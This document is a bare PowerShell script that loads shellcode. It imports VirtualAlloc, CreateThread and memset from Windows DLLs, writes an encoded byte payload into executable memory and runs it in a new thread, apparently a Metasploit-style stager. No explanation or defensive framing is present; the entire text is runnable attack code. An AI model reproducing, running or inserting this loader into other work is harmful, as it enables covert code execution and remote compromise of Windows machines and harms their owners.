$wCL8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $wCL8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdb,0xd9,0x74,0x24,0xf4,0xbe,0xad,0x80,0x32,0xad,0x58,0x31,0xc9,0xb1,0x47,0x31,0x70,0x18,0x83,0xc0,0x04,0x03,0x70,0xb9,0x62,0xc7,0x51,0x29,0xe0,0x28,0xaa,0xa9,0x85,0xa1,0x4f,0x98,0x85,0xd6,0x04,0x8a,0x35,0x9c,0x49,0x26,0xbd,0xf0,0x79,0xbd,0xb3,0xdc,0x8e,0x76,0x79,0x3b,0xa0,0x87,0xd2,0x7f,0xa3,0x0b,0x29,0xac,0x03,0x32,0xe2,0xa1,0x42,0x73,0x1f,0x4b,0x16,0x2c,0x6b,0xfe,0x87,0x59,0x21,0xc3,0x2c,0x11,0xa7,0x43,0xd0,0xe1,0xc6,0x62,0x47,0x7a,0x91,0xa4,0x69,0xaf,0xa9,0xec,0x71,0xac,0x94,0xa7,0x0a,0x06,0x62,0x36,0xdb,0x57,0x8b,0x95,0x22,0x58,0x7e,0xe7,0x63,0x5e,0x61,0x92,0x9d,0x9d,0x1c,0xa5,0x59,0xdc,0xfa,0x20,0x7a,0x46,0x88,0x93,0xa6,0x77,0x5d,0x45,0x2c,0x7b,0x2a,0x01,0x6a,0x9f,0xad,0xc6,0x00,0x9b,0x26,0xe9,0xc6,0x2a,0x7c,0xce,0xc2,0x77,0x26,0x6f,0x52,0xdd,0x89,0x90,0x84,0xbe,0x76,0x35,0xce,0x52,0x62,0x44,0x8d,0x3a,0x47,0x65,0x2e,0xba,0xcf,0xfe,0x5d,0x88,0x50,0x55,0xca,0xa0,0x19,0x73,0x0d,0xc7,0x33,0xc3,0x81,0x36,0xbc,0x34,0x8b,0xfc,0xe8,0x64,0xa3,0xd5,0x90,0xee,0x33,0xda,0x44,0x9a,0x36,0x4c,0x30,0x86,0x44,0x7a,0xd6,0x3a,0xb7,0x86,0x5f,0xb2,0x51,0xd6,0xcf,0x94,0xcd,0x96,0xbf,0x54,0xbe,0x7e,0xaa,0x5a,0xe1,0x9e,0xd5,0xb0,0x8a,0x34,0x3a,0x6d,0xe2,0xa0,0xa3,0x34,0x78,0x51,0x2b,0xe3,0x04,0x51,0xa7,0x00,0xf8,0x1f,0x40,0x6c,0xea,0xf7,0xa0,0x3b,0x50,0x51,0xbe,0x91,0xff,0x5d,0x2a,0x1e,0x56,0x0a,0xc2,0x1c,0x8f,0x7c,0x4d,0xde,0xfa,0xf7,0x44,0x4a,0x45,0x6f,0xa9,0x9a,0x45,0x6f,0xff,0xf0,0x45,0x07,0xa7,0xa0,0x15,0x32,0xa8,0x7c,0x0a,0xef,0x3d,0x7f,0x7b,0x5c,0x95,0x17,0x81,0xbb,0xd1,0xb7,0x7a,0xee,0xe3,0x84,0xac,0xd6,0x91,0xe4,0x6c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Os8=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Os8.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Os8,0,0,0);for (;;){Start-sleep 60};
